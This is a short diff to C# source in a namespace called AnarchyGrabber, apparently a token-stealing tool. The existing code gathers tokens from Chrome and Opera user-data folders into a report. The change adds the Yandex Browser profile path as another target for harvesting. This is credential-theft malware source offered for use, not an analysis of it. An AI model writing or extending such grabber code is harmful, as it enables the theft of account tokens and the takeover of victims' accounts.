@@ -17,6 +17,8 @@ namespace AnarchyGrabber
             report.AddRange(Grabber.GetTokens(@"Local\Google\Chrome\User Data\Default"));
             report.Add("\n**Opera**");
             report.AddRange(Grabber.GetTokens(@"Roaming\Opera Software\Opera Stable", true));
+            report.Add("\n**Yandex**");
+            report.AddRange(Grabber.GetTokens(@"Local\Yandex\YandexBrowser\User Data\Default", true));
 
             if (Grabber.TokensFound)
             {
